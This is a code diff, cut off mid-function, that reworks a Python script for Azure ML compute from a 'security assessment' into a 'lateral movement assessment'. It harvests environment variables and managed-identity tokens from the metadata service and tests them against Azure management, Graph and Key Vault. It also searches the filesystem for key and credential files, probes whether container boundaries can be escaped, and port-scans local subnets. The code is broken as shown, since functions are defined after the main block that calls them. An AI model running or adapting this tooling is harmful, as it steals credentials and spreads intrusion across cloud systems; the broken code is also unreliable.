@@ -7,57 +7,20 @@ import subprocess
 import platform
 import uuid
 import datetime
+import ipaddress
 import base64
 from pathlib import Path
 import traceback
+import re
+import tempfile
+import time
+import xml.etree.ElementTree as ET
 
-# Add robust file writing with multiple fallback locations
-def save_results_with_fallback(report):
-    """Try to save results to multiple locations if the primary fails"""
-    possible_locations = [
-        "/tmp/security_assessment.json",
-        "./security_assessment.json",
-        os.path.join(os.path.expanduser("~"), "security_assessment.json"),
-        os.path.join(os.getcwd(), "security_assessment.json")
-    ]
-    
-    # Add the AZUREML_SCRIPT_DIRECTORY location if it exists (common in AML)
-    if "AZUREML_SCRIPT_DIRECTORY" in os.environ:
-        possible_locations.insert(0, os.path.join(os.environ["AZUREML_SCRIPT_DIRECTORY"], "security_assessment.json"))
-    
-    success = False
-    saved_path = None
-    
-    for location in possible_locations:
-        try:
-            # Ensure directory exists
-            os.makedirs(os.path.dirname(location), exist_ok=True)
-            
-            # Try to write to this location
-            with open(location, "w") as f:
-                json.dump(report, f, indent=2, default=str)
-            
-            # Verify the file was written
-            if os.path.exists(location) and os.path.getsize(location) > 0:
-                print(f"Results successfully saved to: {location}")
-                success = True
-                saved_path = location
-                break
-        except Exception as e:
-            print(f"Failed to save to {location}: {str(e)}")
-    
-    if not success:
-        print("WARNING: Failed to save results to any location!")
-        # As a last resort, print to stdout
-        print("--- SECURITY ASSESSMENT RESULTS ---")
-        print(json.dumps(report, indent=2, default=str))
-    
-    return saved_path
-
-def run_command(command):
+def run_command(command, timeout=30):
     """Run a shell command and return output"""
     try:
-        result = subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
+        result = subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, 
+                                stderr=subprocess.PIPE, text=True, timeout=timeout)
         return {
             "command": command,
             "returncode": result.returncode,
@@ -67,7 +30,7 @@ def run_command(command):
     except subprocess.TimeoutExpired:
         return {
             "command": command,
-            "error": "Command timed out after a minute",
+            "error": f"Command timed out after {timeout} seconds",
             "returncode": -1
         }
     except Exception as e:
@@ -77,521 +40,70 @@ def run_command(command):
             "returncode": -1
         }
 
-def check_network_access():
-    """Test network connectivity to various endpoints"""
+def discover_network():
+    """Discover network topology and accessible hosts"""
     results = {}
     
-    # Test endpoints
-    endpoints = [
-        "169.254.169.254",  # Azure IMDS
-        "168.63.129.16",    # Azure DNS
-        "management.azure.com",
-        "storage.azure.com",
-        "graph.microsoft.com",
-        "vault.azure.net",
-        "example.com",      # External site
-        "10.0.0.1",         # Internal network test
-        "172.16.0.1",       # Internal network test
-        "192.168.0.1"       # Internal network test
-    ]
+    # Get local network info
+    network_info = {}
     
-    for endpoint in endpoints:
-        try:
-            # Try to resolve the hostname
-            ip = socket.gethostbyname(endpoint)
-            
-            # Try to connect to port 80
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
-            result = sock.connect_ex((ip, 80))
-            sock.close()
-            
-            results[endpoint] = {
-                "resolved_ip": ip,
-                "port_80_open": (result == 0),
-                "port_80_result": result
-            }
-            
-            # For IMDS endpoint, try to access metadata
-            if endpoint == "169.254.169.254":
+    # Get local interfaces
+    if platform.system() == "Windows":
+        ipconfig = run_command("ipconfig /all")
+        network_info["interfaces"] = ipconfig
+    else:
+        ifconfig = run_command("ip addr")
+        network_info["interfaces"] = ifconfig
+        
+        # Get routing table
+        routes = run_command("ip route")
+        network_info["routes"] = routes
+    
+    results["network_info"] = network_info
+    
+    # Extract IP addresses and subnets from interface info
+    local_subnets = []
+    ip_pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}"
+    
+    # Check both stdout and stderr for IP addresses
+    if platform.system() != "Windows":
+        text_to_search = network_info["interfaces"]["stdout"] + network_info["interfaces"]["stderr"]
+        matches = re.findall(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", text_to_search)
+        for match in matches:
+            if not match.startswith("127."):
                 try:
-                    imds_resp = requests.get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", 
-                                          headers={"Metadata": "true"}, timeout=5)
-                    results[endpoint]["imds_access"] = {
-                        "status_code": imds_resp.status_code,
-                        "response": imds_resp.json() if imds_resp.status_code == 200 else None
-                    }
-                except Exception as e:
-                    results[endpoint]["imds_access"] = {"error": str(e)}
-        except Exception as e:
-            results[endpoint] = {"error": str(e)}
-    
-    return results
-
-def check_file_access():
-    """Test access to various file paths"""
-    sensitive_paths = [
-        "/etc/passwd",
-        "/etc/shadow",
-        "/etc/hosts",
-        "/etc/resolv.conf",
-        "/var/run/secrets",
-        "/root",
-        "/home",
-        "/mnt",
-        "/tmp",
-        "/dev/shm",
-        "/opt",
-        "C:\\Windows\\System32" if platform.system() == "Windows" else None,
-        "C:\\Users" if platform.system() == "Windows" else None,
-        os.environ.get("AZURE_CONFIG_DIR", "")
-    ]
-    
-    results = {}
-    for path in sensitive_paths:
-        if not path:
-            continue
-            
-        p = Path(path)
-        results[path] = {
-            "exists": p.exists(),
-            "is_dir": p.is_dir() if p.exists() else None,
-            "readable": os.access(path, os.R_OK) if p.exists() else None,
-            "writable": os.access(path, os.W_OK) if p.exists() else None,
-            "executable": os.access(path, os.X_OK) if p.exists() else None
-        }
-        
-        # If it's a directory, list first few entries
-        if p.is_dir() and os.access(path, os.R_OK):
-            try:
-                entries = list(p.iterdir())[:5]  # List only first 5 for brevity
-                results[path]["entries"] = [str(entry.name) for entry in entries]
-                results[path]["entry_count"] = len(list(p.iterdir()))
-            except Exception as e:
-                results[path]["entries_error"] = str(e)
-        
-        # If it's a readable file, get file size
-        if p.is_file() and os.access(path, os.R_OK):
-            results[path]["size"] = p.stat().st_size
-            
-            # For small text files, get first few lines
-            if p.stat().st_size < 10000 and path.endswith((".conf", ".cfg", ".txt", "")):
-                try:
-                    with open(path, 'r') as file:
-                        results[path]["content_sample"] = file.read(1000)  # First 1000 chars
-                except Exception as e:
-                    results[path]["content_error"] = str(e)
-    
-    return results
-
-def check_environment_variables():
-    """Test access to environment variables"""
-    # Get all environment variables
-    all_vars = dict(os.environ)
-    
-    # Identify sensitive variables
-    sensitive_prefixes = [
-        "AZURE_",
-        "ARM_",
-        "AWS_",
-        "SECRET_",
-        "TOKEN_",
-        "API_",
-        "PASSWORD",
-        "CREDENTIAL",
-        "KEY",
-        "CERT",
-        "AUTH"
-    ]
-    
-    # Create filtered output with sensitive values masked
-    filtered_vars = {}
-    sensitive_vars = {}
-    
-    for key, value in all_vars.items():
-        filtered_vars[key] = value
-        
-        # Check if this looks like a sensitive variable
-        is_sensitive = any(key.upper().startswith(prefix) or prefix in key.upper() for prefix in sensitive_prefixes)
-        
-        if is_sensitive:
-            sensitive_vars[key] = "REDACTED"
-            # We're redacting in the report, but could log the real values elsewhere
-    
-    # Special check for MSI endpoint variables
-    msi_related = {k: v for k, v in all_vars.items() if "IDENTITY" in k.upper() or "MSI" in k.upper()}
-    
-    return {
-        "all_variables": filtered_vars,
-        "sensitive_variables": sensitive_vars,
-        "msi_related": msi_related,
-        "count": len(all_vars)
-    }
-
-def check_cloud_access():
-    """Test access to cloud resources"""
-    results = {}
-    
-    # Try to access Azure Resource Manager
-    try:
-        # This will work if the compute has a managed identity
-        response = requests.get(
-            "https://management.azure.com/subscriptions?api-version=2020-01-01",
-            headers={"Authorization": "Bearer " + os.environ.get("IDENTITY_HEADER", "")},
-            timeout=10
-        )
-        results["arm_access"] = {
-            "status_code": response.status_code,
-            "response": response.json() if response.status_code < 300 else response.text[:200]
-        }
-    except Exception as e:
-        results["arm_access"] = {"error": str(e)}
-    
-    # Try to access storage account if info is available
-    storage_account = os.environ.get("STORAGE_ACCOUNT_NAME")
-    if storage_account:
-        try:
-            response = requests.get(
-                f"https://{storage_account}.blob.core.windows.net/?comp=list",
-                timeout=10
-            )
-            results["storage_access"] = {
-                "status_code": response.status_code,
-                "response_sample": response.text[:200] if response.text else None
-            }
-        except Exception as e:
-            results["storage_access"] = {"error": str(e)}
-    
-    return results
-
-def check_process_privileges():
-    """Check process privileges and capabilities"""
-    results = {}
-    
-    # Get user and group information
-    results["user_info"] = run_command("id")
-    
-    # Check if we can run sudo
-    results["sudo_access"] = run_command("sudo -n true")
-    
-    # Check for docker access
-    results["docker_access"] = run_command("docker ps")
-    
-    # Check for network tools
-    results["network_tools"] = {
-        "netstat": run_command("netstat -tulpn"),
-        "ss": run_command("ss -tulpn"),
-        "iptables": run_command("iptables -L")
-    }
-    
-    # Check for mounted volumes
-    results["mounts"] = run_command("mount")
-    
-    # Check running processes
-    results["processes"] = run_command("ps aux | head -20")
-    
-    return results
-
-def network_port_scan():
-    """Scan common ports on localhost and other key addresses"""
-    targets = ["127.0.0.1", "169.254.169.254", "168.63.129.16"]
-    ports = [22, 80, 443, 445, 1433, 3306, 5432, 6379, 8080, 8443]
-    results = {}
-    
-    for target in targets:
-        results[target] = {}
-        for port in ports:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(1)
-                result = sock.connect_ex((target, port))
-                if result == 0:
-                    results[target][port] = "OPEN"
-                else:
-                    results[target][port] = f"CLOSED ({result})"
-                sock.close()
-            except Exception as e:
-                results[target][port] = f"ERROR: {str(e)}"
-    
-    return results
-
-def check_filesystem_permissions():
-    """Check for world-writable directories and SUID/SGID binaries"""
-    results = {}
-    
-    # Check for world-writable dirs
-    results["world_writable_dirs"] = run_command("find / -type d -perm -2 -not -path \"/proc/*\" -not -path \"/sys/*\" -ls 2>/dev/null | head -20")
-    
-    # Check for SUID binaries
-    results["suid_binaries"] = run_command("find / -perm -4000 -type f -not -path \"/proc/*\" -not -path \"/sys/*\" -exec ls -la {} \\; 2>/dev/null | head -20")
-    
-    return results
-
-def check_container_boundaries():
-    """Test container isolation boundaries"""
-    results = {}
-    
-    # Check for container indicators
-    try:
-        cgroup_content = ""
-        if os.path.exists("/proc/self/cgroup"):
-            with open("/proc/self/cgroup", 'r') as f:
-                cgroup_content = f.read()
-        
-        results["container_detection"] = {
-            "cgroup": {"stdout": cgroup_content},
-            "docker_env": run_command("grep -q docker /proc/1/cgroup 2>/dev/null && echo 'Docker detected' || echo 'No Docker'"),
-            "is_container": os.path.exists("/.dockerenv") or 
-                           (os.path.exists("/proc/1/cgroup") and 
-                            any("docker" in line for line in open("/proc/1/cgroup").readlines() if "docker" in line))
-        }
-    except Exception as e:
-        results["container_detection"] = {"error": str(e)}
-    
-    # Test access to host devices
-    results["device_access"] = run_command("ls -la /dev/")
-    
-    # Try to access host network namespace
-    results["host_network"] = run_command("ip link show host || echo 'No access to host network'")
-    
-    # Check if we can write to supposedly read-only paths
-    results["readonly_paths"] = {
-        "etc_write_test": run_command("touch /etc/test_write_access && echo 'Write successful' || echo 'Write failed'"),
-        "bin_write_test": run_command("touch /bin/test_write_access && echo 'Write successful' || echo 'Write failed'")
-    }
-    
-    # Try to access parent mounts
-    results["parent_mounts"] = run_command("ls -la /proc/1/root/ 2>/dev/null || echo 'Cannot access parent root'")
-    
-    return results
-
-def extract_and_test_tokens():
-    """Extract and test token permissions"""
-    results = {}
-    
-    # Extract JWT tokens from environment
-    jwt_vars = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['TOKEN', 'JWT', 'AUTH'])}
-    
-    # For each token, get basic info without revealing the token
-    token_info = {}
-    for k, v in jwt_vars.items():
-        if not v or not isinstance(v, str) or not v.count('.') >= 2:
-            continue  # Not a JWT token
-            
-        try:
-            # Just get the header part to identify token type
-            parts = v.split('.')
-            if len(parts) >= 2:
-                padding = '=' * (4 - len(parts[0]) % 4)
-                header = json.loads(base64.b64decode(parts[0] + padding).decode('utf-8'))
-                token_info[k] = {
-                    "alg": header.get("alg"),
-                    "typ": header.get("typ"),
-                    "kid": header.get("kid")
-                }
-        except Exception as e:
-            token_info[k] = {"error": str(e)}
-    
-    results["jwt_tokens"] = token_info
-    
-    # Test MSI access - what resources can we access?
-    msi_tests = {}
-    
-    # Test endpoints to check MSI permissions
-    endpoints_to_test = [
-        "https://management.azure.com/subscriptions?api-version=2020-01-01",
-        "https://graph.microsoft.com/v1.0/me",
-        "https://vault.azure.net/",
-        "https://storage.azure.com/"
-    ]
-    
-    for endpoint in endpoints_to_test:
-        try:
-            # Get token for this resource first
-            resource = endpoint.split('/')[2]
-            token_resp = requests.get(
-                f"{os.environ.get('MSI_ENDPOINT', 'http://169.254.169.254/metadata/identity/oauth2/token')}?resource=https://{resource}",
-                headers={"Metadata": "true", "Secret": os.environ.get("MSI_SECRET", "")},
-                timeout=5
-            )
-            if token_resp.status_code == 200:
-                token = token_resp.json().get("access_token", "")
-                
-                # Now test the token against the endpoint
-                resp = requests.get(endpoint, headers={"Authorization": f"Bearer {token}"}, timeout=5)
-                msi_tests[resource] = {
-                    "status_code": resp.status_code,
-                    "has_access": resp.status_code < 300,
-                    "response_preview": str(resp.text)[:100] if resp.text else None
-                }
-            else:
-                msi_tests[resource] = {"error": f"Failed to get token: {token_resp.status_code}"}
-        except Exception as e:
-            msi_tests[resource] = {"error": str(e)}
-    
-    results["msi_access_tests"] = msi_tests
-    
-    return results
-
-def extensive_network_scan():
-    """Perform more extensive network scanning"""
-    results = {}
-    
-    # Test outbound connectivity to additional services
-    outbound_tests = {
-        "storage": run_command("curl -s -o /dev/null -w '%{http_code}' https://storage.azure.com"),
-        "keyvault": run_command("curl -s -o /dev/null -w '%{http_code}' https://vault.azure.net"),
-        "docker_hub": run_command("curl -s -o /dev/null -w '%{http_code}' https://hub.docker.com"),
-        "github": run_command("curl -s -o /dev/null -w '%{http_code}' https://github.com"),
-        "pypi": run_command("curl -s -o /dev/null -w '%{http_code}' https://pypi.org")
-    }
-    results["outbound_connectivity"] = outbound_tests
-    
-    # Scan internal networks more thoroughly (limiting scope to avoid excessive scanning)
-    internal_ranges = ["10.0.0", "172.16.0", "172.17.0", "192.168.0"]
-    internal_scan = {}
-    
-    for prefix in internal_ranges:
-        hosts = {}
-        # Only scan first 5 hosts in each range for brevity and to avoid excessive scanning
-        for i in range(1, 5):
-            ip = f"{prefix}.{i}"
-            ping_result = run_command(f"ping -c 1 -W 1 {ip}")
-            hosts[ip] = {
-                "ping": ping_result["returncode"] == 0,
-                "response_time": ping_result["stdout"] if ping_result["returncode"] == 0 else None
-            }
-        internal_scan[prefix] = hosts
-    
-    results["internal_network_scan"] = internal_scan
-    
-    # Check for local services
-    local_services = {}
-    common_ports = [22, 80, 443, 2375, 2376, 3306, 5432, 6379, 8080, 8443, 9090, 9200, 9300, 10250]
-    
-    for port in common_ports:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            result = sock.connect_ex(("127.0.0.1", port))
-            if result == 0:
-                service_banner = ""
-                try:
-                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
-                    service_banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                    subnet = ipaddress.IPv4Network(match, strict=False)
+                    local_subnets.append(str(subnet))
                 except:
                     pass
-                local_services[port] = {
-                    "status": "OPEN",
-                    "banner": service_banner[:100] if service_banner else None
-                }
-            sock.close()
-        except:
-            pass
     
-    results["local_services"] = local_services
+    results["local_subnets"] = local_subnets
     
-    # Extended IMDS testing
-    imds_endpoints = [
-        "/metadata/instance?api-version=2021-02-01",
-        "/metadata/scheduledevents?api-version=2019-08-01",
-        "/metadata/attested/document?api-version=2020-09-01"
-    ]
+    # Get ARP table to find known hosts
+    if platform.system() == "Windows":
+        arp = run_command("arp -a")
+    else:
+        arp = run_command("ip neigh")
     
-    imds_results = {}
-    for endpoint in imds_endpoints:
-        try:
-            resp = requests.get(f"http://169.254.169.254{endpoint}", headers={"Metadata": "true"}, timeout=5)
-            imds_results[endpoint] = {
-                "status_code": resp.status_code,
-                "response_sample": str(resp.text)[:200] if resp.text else None
-            }
-        except Exception as e:
-            imds_results[endpoint] = {"error": str(e)}
+    results["arp_table"] = arp
     
-    results["extended_imds"] = imds_results
+    # Extract IP addresses from ARP table
+    known_hosts = []
+    if platform.system() != "Windows":
+        text_to_search = arp["stdout"] + arp["stderr"]
+        matches = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", text_to_search)
+        known_hosts.extend([ip for ip in matches if not ip.startswith("127.")])
+    
+    results["known_hosts"] = list(set(known_hosts))  # Remove duplicates
     
     return results
 
-def check_data_access_and_logging():
-    """Test access to data and ability to manipulate logging"""
-    results = {}
-    
-    # Check access to storage locations
-    storage_paths = [
-        "/mnt/azureml",
-        "/tmp",
-        "/var/log",
-        "/opt/miniconda",
-        "/azureml-envs"
-    ]
-    
-    storage_access = {}
-    for path in storage_paths:
-        if os.path.exists(path):
-            try:
-                dirs = os.listdir(path)
-                top_dirs = dirs[:5] if len(dirs) > 5 else dirs
-                test_write = False
-                try:
-                    test_file = os.path.join(path, ".write_test")
-                    with open(test_file, 'w') as f:
-                        f.write("test")
-                    test_write = True
-                    os.remove(test_file)
-                except:
-                    test_write = False
-                
-                storage_access[path] = {
-                    "accessible": True,
-                    "writable": test_write,
-                    "top_items": top_dirs,
-                    "total_items": len(dirs)
-                }
-            except Exception as e:
-                storage_access[path] = {"accessible": False, "error": str(e)}
-        else:
-            storage_access[path] = {"exists": False}
-    
-    results["storage_access"] = storage_access
-    
-    # Check for credential files
-    credential_patterns = [
-        "*.key", 
-        "*.pem", 
-        "*.pfx", 
-        "*.crt", 
-        "*.config", 
-        "connection*.json", 
-        "cred*.json",
-        ".azure"
-    ]
-    
-    credential_files = {}
-    for pattern in credential_patterns:
-        cmd = f"find / -name '{pattern}' -type f -not -path '*/proc/*' -not -path '*/sys/*' -not -path '*/dev/*' 2>/dev/null | head -10"
-        result = run_command(cmd)
-        credential_files[pattern] = result["stdout"].splitlines() if result["returncode"] == 0 else []
-    
-    results["potential_credential_files"] = credential_files
-    
-    # Check logging controls
-    logging_controls = {
-        "syslog_writable": os.access("/var/log/syslog", os.W_OK) if os.path.exists("/var/log/syslog") else False,
-        "log_directory_writable": os.access("/var/log", os.W_OK) if os.path.exists("/var/log") else False,
-        "audit_config": run_command("test -f /etc/audit/auditd.conf && cat /etc/audit/auditd.conf | grep -v ^# | grep . || echo 'No audit config found'")
-    }
-    
-    results["logging_controls"] = logging_controls
-    
-    return results
-
-# Update the main function to include new tests and better error handling
-def run_security_assessment():
-    """Run all security checks and compile results"""
+def run_lateral_movement_assessment():
+    """Run all lateral movement tests and compile results"""
     start_time = datetime.datetime.now()
     
-    # Initialize empty report structure
+    print("Starting lateral movement assessment...")
+    
     report = {
         "timestamp": start_time.isoformat(),
         "compute_info": {
@@ -600,124 +112,1026 @@ def run_security_assessment():
             "python_version": sys.version,
             "cpu_count": os.cpu_count(),
             "uuid": str(uuid.uuid4())  # Generate a unique ID for this report
-        }
+        },
+        "network_discovery": discover_network(),
+        "kubernetes_access": test_kubernetes_access(),
+        "managed_identity_access": test_managed_identity_access(),
+        "container_escape": test_docker_escape(),
+        "metadata_services": test_metadata_services(),
+        "unprotected_services": scan_for_unprotected_services(),
+        "credential_leaks": test_for_credential_leaks(),
+        "storage_access": test_for_storage_access(),
+        "aml_specific": test_aml_specific_vectors()
     }
-    
-    # List of test functions to run with proper error handling
-    test_functions = [
-        ("environment_variables", check_environment_variables),
-        ("network_access", check_network_access),
-        ("file_access", check_file_access),
-        ("cloud_access", check_cloud_access),
-        ("process_privileges", check_process_privileges),
-        ("port_scan", network_port_scan),
-        ("filesystem_permissions", check_filesystem_permissions),
-        ("container_boundaries", check_container_boundaries),
-        ("identity_testing", extract_and_test_tokens),
-        ("extended_network", extensive_network_scan),
-        ("data_access", check_data_access_and_logging)
-    ]
-    
-    # Run each test with proper error handling
-    for section_name, test_function in test_functions:
-        try:
-            print(f"Running test: {section_name}...")
-            report[section_name] = test_function()
-        except Exception as e:
-            print(f"ERROR in {section_name}: {str(e)}")
-            traceback.print_exc()
-            report[section_name] = {"error": str(e), "traceback": traceback.format_exc()}
     
     end_time = datetime.datetime.now()
     report["execution_time_seconds"] = (end_time - start_time).total_seconds()
     
-    # Save results to a file with multiple fallback options
-    output_path = save_results_with_fallback(report)
+    # Save results to a file
+    output_path = "/tmp/lateral_movement_assessment.json"
+    with open(output_path, "w") as f:
+        json.dump(report, f, indent=2, default=str)
+    
+    print(f"Lateral movement assessment complete. Results saved to: {output_path}")
     
     # Print summary
-    print("\n=== SECURITY ASSESSMENT SUMMARY ===")
+    print("\n=== LATERAL MOVEMENT ASSESSMENT SUMMARY ===")
     print(f"Hostname: {report['compute_info']['hostname']}")
     print(f"Platform: {report['compute_info']['platform']}")
-    print(f"Environment Variables: {report['environment_variables']['count']} found")
-    print(f"Sensitive Variables: {len(report['environment_variables']['sensitive_variables'])} identified")
     
-    # Print IMDS access status with proper error handling
-    imds_status = "Unknown"
-    try:
-        if report['network_access'].get('169.254.169.254', {}).get('imds_access', {}).get('status_code') == 200:
-            imds_status = "Available"
-        else:
-            imds_status = "Unavailable"
-    except:
-        imds_status = "Error checking"
-    print(f"IMDS Access: {imds_status}")
+    # Network summary
+    subnets = report['network_discovery'].get('local_subnets', [])
+    hosts = report['network_discovery'].get('known_hosts', [])
+    print(f"Network: {len(subnets)} subnets, {len(hosts)} hosts discovered")
     
-    # Print container escape test results with proper error handling
-    container_escape_tests = 0
-    try:
-        container_escape_tests = len([x for x in report['container_boundaries']['readonly_paths'].values() 
-                                     if 'successful' in x.get('stdout', '').lower()])
-    except:
-        container_escape_tests = "Error checking"
-    print(f"Container Escape Tests: {container_escape_tests}")
+    # Kubernetes access
+    k8s_access = report['kubernetes_access'].get('kubernetes_service_accessible', False)
+    print(f"Kubernetes Access: {'Available' if k8s_access else 'Not Available'}")
     
-    # Print MSI access status with proper error handling
-    msi_access = []
-    try:
-        msi_access = [k for k, v in report['identity_testing']['msi_access_tests'].items() if v.get('has_access')]
-    except:
-        msi_access = ["Error checking"]
-    print(f"MSI Access: {', '.join(msi_access)}")
+    # Managed Identity
+    arm_token = report['managed_identity_access'].get('arm_token_acquired', False)
+    print(f"Managed Identity ARM Access: {'Available' if arm_token else 'Not Available'}")
     
-    # Print output path
-    if output_path:
-        print(f"\nResults saved to: {output_path}")
+    # Container status
+    in_container = report['container_escape'].get('in_container', False)
+    print(f"Container Status: {'Inside Container' if in_container else 'Not in Container'}")
     
-    # Return full report
-    return report, output_path
+    # Metadata services
+    imds_access = report['metadata_services'].get('azure_imds', {}).get('accessible', False)
+    print(f"IMDS Access: {'Available' if imds_access else 'Not Available'}")
+    
+    # Credential leaks
+    cred_count = report['credential_leaks'].get('credential_files', {}).get('count', 0)
+    print(f"Potential Credential Files: {cred_count}")
+    
+    # Storage access
+    storage_token = report['storage_access'].get('storage_token_acquired', False)
+    storage_accounts = len(report['storage_access'].get('storage_accounts_found', []))
+    print(f"Storage Access: {'Available' if storage_token else 'Not Available'} ({storage_accounts} accounts found)")
+    
+    # AML specific
+    ml_workspaces = 0
+    if 'ml_workspaces' in report.get('aml_specific', {}):
+        for sub_id, sub_data in report['aml_specific']['ml_workspaces'].items():
+            ml_workspaces += sub_data.get('count', 0)
+    
+    print(f"Azure ML Workspaces Accessible: {ml_workspaces}")
+    
+    # Identify critical findings for lateral movement
+    print("\n=== CRITICAL LATERAL MOVEMENT VECTORS ===")
+    
+    critical_findings = []
+    
+    # Check for docker socket access (container escape)
+    if report['container_escape'].get('docker_socket_mounted', False):
+        critical_findings.append("Docker socket mounted - potential container escape")
+    
+    # Check for privileged container
+    privileged = any(v.get('writable', False) for k, v in 
+                    report['container_escape'].get('privileged_indicators', {}).items())
+    if privileged:
+        critical_findings.append("Container running in privileged mode - potential host access")
+    
+    # Check for suspicious mounts
+    if report['container_escape'].get('suspicious_mounts', []):
+        critical_findings.append(f"Suspicious host paths mounted: {len(report['container_escape']['suspicious_mounts'])} found")
+    
+    # Check for unprotected services
+    for service, data in report['unprotected_services'].get('localhost', {}).items():
+        if data.get('accessible', False):
+            critical_findings.append(f"Unprotected {service} service accessible locally")
+    
+    # Check for exposed services on subnet
+    if 'live_hosts' in report['unprotected_services'].get('subnet_scan', {}):
+        live_host_count = len(report['unprotected_services']['subnet_scan']['live_hosts'])
+        if live_host_count > 1:  # More than just localhost
+            critical_findings.append(f"Multiple live hosts ({live_host_count}) found on local subnet")
+            
+            # Check for critical ports
+            critical_port_hosts = []
+            for host, port_data in report['unprotected_services']['subnet_scan'].get('port_scan', {}).items():
+                for port, port_info in port_data.items():
+                    if port_info.get('state', '') == 'OPEN' and port in [22, 6379, 6443, 10250, 27017]:
+                        critical_port_hosts.append(f"{host}:{port}")
+            
+            if critical_port_hosts:
+                critical_findings.append(f"Critical ports open on network: {', '.join(critical_port_hosts[:5])}")
+    
+    # Check for storage account access
+    storage_results = report['storage_access'].get('storage_access_results', {})
+    for account, account_data in storage_results.items():
+        if account_data.get('containers', {}).get('accessible', False):
+            critical_findings.append(f"Storage account {account} containers accessible")
+    
+    # Check for kubernetes access
+    if report['kubernetes_access'].get('kubernetes_service_accessible', False):
+        critical_findings.append("Kubernetes API accessible")
+    
+    # Check for AML workspace access
+    if 'ml_workspaces' in report.get('aml_specific', {}):
+        for sub_id, sub_data in report['aml_specific']['ml_workspaces'].items():
+            for ws in sub_data.get('workspaces', []):
+                if ws.get('compute_access', {}).get('accessible', False):
+                    critical_findings.append(f"AML workspace {ws['name']} compute resources accessible")
+    
+    # Print critical findings
+    if critical_findings:
+        for finding in critical_findings:
+            print(f"- {finding}")
+    else:
+        print("No critical lateral movement vectors identified")
+    
+    return report
 
 if __name__ == "__main__":
     try:
-        print("Starting security assessment...")
-        report, output_path = run_security_assessment()
-        
-        # Print a confirmation message with the output path
-        if output_path:
-            print(f"\nSecurity assessment complete. Results saved to: {output_path}")
-            # Print file size to confirm it was written correctly
-            if os.path.exists(output_path):
-                print(f"Output file size: {os.path.getsize(output_path)} bytes")
-            else:
-                print(f"WARNING: Output file not found at {output_path} after writing!")
-        else:
-            print("WARNING: Failed to save results to a file!")
-        
-        # For demo purposes, print a compact version of the most important findings
-        try:
-            important_findings = {
-                "compute_info": report["compute_info"],
-                "imds_access": report["network_access"].get("169.254.169.254", {}).get("imds_access", {}),
-                "sudo_access": report["process_privileges"]["sudo_access"]["returncode"] == 0,
-                "docker_access": report["process_privileges"]["docker_access"]["returncode"] == 0,
-                "sensitive_env_count": len(report["environment_variables"]["sensitive_variables"]),
-                "arm_access": report["cloud_access"].get("arm_access", {}),
-                "container_escape_possible": any('successful' in x.get('stdout', '').lower() 
-                                               for x in report['container_boundaries']['readonly_paths'].values()),
-                "msi_resources_accessible": [k for k, v in report['identity_testing']['msi_access_tests'].items() 
-                                           if v.get('has_access')],
-                "credential_files_found": sum(len(files) for files in report['data_access']['potential_credential_files'].values())
-            }
-            
-            print("\n=== CRITICAL FINDINGS ===")
-            print(json.dumps(important_findings, indent=2, default=str))
-        except Exception as e:
-            print(f"Error generating summary: {str(e)}")
-        
-        # Exit with success
-        print("\nAssessment complete with exit code: 0")
-        sys.exit(0)
-        
+        report = run_lateral_movement_assessment()
     except Exception as e:
-        print(f"Error during security assessment: {str(e)}")
+        print(f"Error during lateral movement assessment: {str(e)}")
         traceback.print_exc()
         sys.exit(1)
+
+def scan_subnet(subnet, ports_to_scan=None):
+    """Scan a subnet for hosts and open ports"""
+    if ports_to_scan is None:
+        ports_to_scan = [22, 80, 443, 445, 1433, 3306, 5432, 6379, 8080, 8443, 9200, 9300, 27017, 6443]
+    
+    results = {}
+    
+    # First, scan for live hosts with ping to avoid timeout on every port scan
+    live_hosts = []
+    
+    try:
+        network = ipaddress.IPv4Network(subnet)
+        
+        # Limit scan to first 25 hosts in large subnets
+        hosts_to_scan = list(network.hosts())[:25]
+        
+        for host in hosts_to_scan:
+            host_str = str(host)
+            
+            # Skip local address
+            if host_str.startswith("127."):
+                continue
+                
+            ping_result = run_command(f"ping -c 1 -W 1 {host_str}" if platform.system() != "Windows" 
+                                     else f"ping -n 1 -w 1000 {host_str}", timeout=2)
+            
+            if ping_result["returncode"] == 0:
+                live_hosts.append(host_str)
+    except Exception as e:
+        results["error"] = str(e)
+    
+    results["live_hosts"] = live_hosts
+    results["port_scan"] = {}
+    
+    # Now scan ports on live hosts
+    for host in live_hosts:
+        results["port_scan"][host] = {}
+        
+        for port in ports_to_scan:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((host, port))
+                
+                if result == 0:
+                    # Port is open, try to get service banner for identification
+                    try:
+                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                    except:
+                        banner = ""
+                    
+                    results["port_scan"][host][port] = {
+                        "state": "OPEN",
+                        "banner": banner[:200] if banner else ""
+                    }
+                else:
+                    results["port_scan"][host][port] = {
+                        "state": f"CLOSED ({result})"
+                    }
+                sock.close()
+            except Exception as e:
+                results["port_scan"][host][port] = {
+                    "state": f"ERROR: {str(e)}"
+                }
+    
+    return results
+
+def test_kubernetes_access():
+    """Test if we have access to Kubernetes endpoints and API"""
+    results = {}
+    
+    # Check for kubectl
+    kubectl = run_command("which kubectl || echo 'Not found'")
+    results["kubectl_installed"] = "Not found" not in kubectl["stdout"]
+    
+    # Check for kubeconfig files
+    kube_config_locations = [
+        os.path.expanduser("~/.kube/config"),
+        "/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+    ]
+    
+    found_configs = {}
+    for loc in kube_config_locations:
+        path = Path(loc)
+        if path.exists():
+            try:
+                if path.is_file() and path.stat().st_size < 10000:
